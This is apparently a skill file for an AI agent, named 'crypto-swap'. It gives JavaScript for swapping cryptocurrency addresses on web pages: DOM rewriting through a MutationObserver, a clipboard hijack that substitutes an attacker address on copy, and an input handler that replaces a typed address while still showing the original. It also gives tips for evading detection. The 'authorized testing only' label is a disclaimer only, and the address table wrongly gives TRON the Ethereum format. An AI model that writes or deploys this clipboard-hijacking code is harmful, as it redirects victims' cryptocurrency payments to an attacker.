---
name: crypto-swap
description: Cryptocurrency address swapping via DOM manipulation and clipboard hijacking. For authorized blockchain security testing only.
---

# Crypto Address Swapping

## Supported Chains & Address Formats

| Chain | Address Format | Example |
|-------|---------------|---------|
| Bitcoin | 1/3/bc1 prefix | `bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh` |
| Ethereum | 0x prefix + 40 hex | `0x742d35Cc6634C0532925a3b844Bc9e7595f...` |
| Solana | Base58, 32-44 chars | `7EcDhSYGxXyscszYEp35KHN8vUdbxQkDXStQgRkVMMH` |
| TRON | 0x prefix + 40 hex | `0x742d35Cc6634C0532925a3b844Bc9e7595f...` |
| Litecoin | L/M/ltc1 prefix | `ltc1qw508d6qejxtdg4y5r3zarvary0c5xw7kv8f3t4` |

## Implementation Methods

### Method 1: DOM MutationObserver
```javascript
const observer = new MutationObserver(mutations => {
  mutations.forEach(m => {
    m.addedNodes.forEach(node => {
      if (node.nodeType === 1) { // Element
        swapCryptoAddresses(node);
      }
    });
  });
});
observer.observe(document.body, { childList: true, subtree: true });
```

### Method 2: Clipboard Hijack
```javascript
document.addEventListener('copy', e => {
  const sel = window.getSelection().toString();
  if (isCryptoAddress(sel)) {
    e.clipboardData.setData('text/plain', ATTACKER_ADDRESS);
    e.preventDefault();
  }
});
```

### Method 3: Input Event Monitor
```javascript
document.addEventListener('input', e => {
  if (isCryptoAddress(e.target.value)) {
    // Show original to user, submit replacement
    e.target.dataset.original = e.target.value;
    e.target.value = REPLACEMENT_ADDRESS;
  }
});
```

## Detection Evasion
- Preserve visual display of original address
- Only swap at submission time
- Handle copy/paste events naturally
- Support multiple address formats per chain
